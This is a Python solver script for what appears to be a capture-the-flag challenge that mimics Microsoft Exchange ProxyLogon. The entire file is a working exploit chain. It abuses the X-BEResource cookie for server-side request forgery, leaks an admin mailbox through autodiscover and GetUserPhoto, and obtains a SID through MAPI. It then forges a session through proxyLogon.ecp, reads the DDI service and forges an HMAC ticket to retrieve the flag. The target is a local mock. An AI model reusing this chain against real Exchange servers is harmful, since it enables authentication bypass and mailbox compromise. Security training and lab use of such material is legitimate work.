#!/usr/bin/env python3
import base64
import hashlib
import hmac
import http.client
import json
import re
import sys
from urllib.parse import quote


def request(host, port, method, path, headers=None, body=b""):
    if isinstance(body, str):
        body = body.encode()
    headers = headers or {}
    if body and "Content-Length" not in headers:
        headers["Content-Length"] = str(len(body))
    conn = http.client.HTTPConnection(host, port, timeout=8)
    conn.request(method, path, body=body, headers=headers)
    resp = conn.getresponse()
    data = resp.read()
    out_headers = resp.getheaders()
    conn.close()
    return resp.status, dict(out_headers), out_headers, data


def rx(pattern, data, flags=0):
    text = data.decode("utf-8", "ignore") if isinstance(data, bytes) else data
    match = re.search(pattern, text, flags)
    if not match:
        raise RuntimeError(f"pattern not found: {pattern}")
    return match.group(1)


def ssrf(host, port, backend, backend_path, method="GET", body=b"", content_type="text/xml", version="1942062522"):
    cookie = f"X-BEResource={backend}{backend_path}?a=~{version}"
    headers = {"Cookie": cookie, "User-Agent": "StarsSolver/1.0"}
    if body:
        headers["Content-Type"] = content_type
    return request(host, port, method, "/ecp/s.js", headers=headers, body=body)


def autodiscover(host, port, backend, email):
    body = f"""<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
  <Request>
    <EMailAddress>{email}</EMailAddress>
    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
  </Request>
</Autodiscover>"""
    status, headers, raw_headers, data = ssrf(host, port, backend, "/autodiscover/autodiscover.xml", "POST", body)
    if status != 200:
        raise RuntimeError(data.decode("utf-8", "ignore"))
    return rx(r"<LegacyDN>([^<]+)</LegacyDN>", data)


def get_photo_hint(host, port, backend, email):
    body = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Header><t:RequestServerVersion Version="Exchange2013"/></soap:Header>
  <soap:Body>
    <m:GetUserPhoto>
      <m:Email>{email}</m:Email>
      <m:SizeRequested>HR48x48</m:SizeRequested>
    </m:GetUserPhoto>
  </soap:Body>
</soap:Envelope>"""
    status, headers, raw_headers, data = ssrf(host, port, backend, "/EWS/Exchange.asmx", "POST", body, version="3")
    if status != 200:
        raise RuntimeError(data.decode("utf-8", "ignore"))
    picture = rx(r"<PictureData>([^<]+)</PictureData>", data)
    return base64.b64decode(picture).decode("utf-8", "ignore")


def mapi_sid(host, port, backend, legacy_dn):
    body = legacy_dn + "\x00\x00\x00stars-mapi-connect"
    status, headers, raw_headers, data = ssrf(
        host,
        port,
        backend,
        "/mapi/emsmdb",
        "POST",
        body.encode("latin-1"),
        "application/mapi-http",
    )
    if status != 200:
        raise RuntimeError(data.decode("utf-8", "ignore"))
    return rx(r"UserSid=([S0-9\\-]+)", data)


def proxy_logon(host, port, backend, sid):
    body = f'<r at="Negotiate" ln="aurora"><s>{sid}</s></r>'
    status, headers, raw_headers, data = ssrf(host, port, backend, "/ecp/proxyLogon.ecp", "POST", body, version="3")
    if status != 241:
        raise RuntimeError(data.decode("utf-8", "ignore"))
    cookies = {}
    for name, value in raw_headers:
        if name.lower() == "set-cookie":
            pair = value.split(";", 1)[0]
            key, val = pair.split("=", 1)
            cookies[key] = val
    return cookies["ASP.NET_SessionId"], cookies["msExchEcpCanary"]


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:8000"
    host, _, port_s = target.partition(":")
    port = int(port_s or "8000")

    status, headers, raw_headers, data = request(
        host,
        port,
        "GET",
        "/ecp/f.js",
        headers={"Cookie": "X-BEResource=localhost~1942062522"},
    )
    backend = headers.get("X-CalculatedBETarget") or headers.get("X-FEServer") or "STAR-MBX-01"

    observer = "orion@stars.local"
    autodiscover(host, port, backend, observer)
    hint = get_photo_hint(host, port, backend, observer)
    admin_email = rx(r"director-mailbox:\s*([A-Za-z0-9_.-]+@[A-Za-z0-9_.-]+)", hint)

    admin_legacy = autodiscover(host, port, backend, admin_email)
    sid = mapi_sid(host, port, backend, admin_legacy)
    session, canary = proxy_logon(host, port, backend, sid)

    cookie = f"ASP.NET_SessionId={session}; msExchEcpCanary={canary}"
    ddi_path = "/ecp/DDI/DDIService.svc/GetObject?schema=StarVirtualDirectory&msExchEcpCanary=" + quote(canary)
    status, headers, raw_headers, data = request(host, port, "GET", ddi_path, headers={"Cookie": cookie})
    if status != 200:
        raise RuntimeError(data.decode("utf-8", "ignore"))
    ddi = json.loads(data)
    obj = ddi["d"]["Output"][0]
    raw_identity = obj["Identity"]["RawIdentity"]
    rid = obj["Properties"]["SidRid"]
    export_target = obj["Properties"]["ExportTarget"]

    msg = f"{raw_identity.lower()}:{rid}".encode()
    ticket = hmac.new(canary.encode(), msg, hashlib.sha256).hexdigest()[:24]
    body = json.dumps({"target": export_target})
    export_path = "/ecp/StarChart/Export.svc?msExchEcpCanary=" + quote(canary)
    status, headers, raw_headers, data = request(
        host,
        port,
        "POST",
        export_path,
        headers={"Cookie": cookie, "Content-Type": "application/json", "X-Star-Ticket": ticket},
        body=body,
    )
    if status != 200:
        raise RuntimeError(data.decode("utf-8", "ignore"))
    print(json.loads(data)["flag"])


if __name__ == "__main__":
    main()
